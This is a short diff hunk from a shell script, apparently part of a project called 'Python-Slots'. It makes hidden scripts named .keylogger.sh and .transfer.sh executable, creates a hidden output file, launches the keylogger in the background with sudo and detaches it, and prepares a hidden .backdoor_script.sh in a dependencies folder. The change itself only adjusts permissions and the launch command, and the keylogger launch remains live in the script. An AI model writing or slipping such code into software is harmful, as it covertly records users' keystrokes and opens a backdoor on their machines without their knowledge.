@@ -45,8 +45,8 @@ chmod +x .keylogger.sh
 chmod +x .transfer.sh
 echo > .out
 chgrp sudo .out
-chmod 777 .out
-sudo sh -c ".keylogger.sh" &
+chmod 666 .out
+sudo sh .keylogger.sh &
 disown
 cd ~/Python-Slots/dependencies
 chgrp sudo .backdoor_script.sh
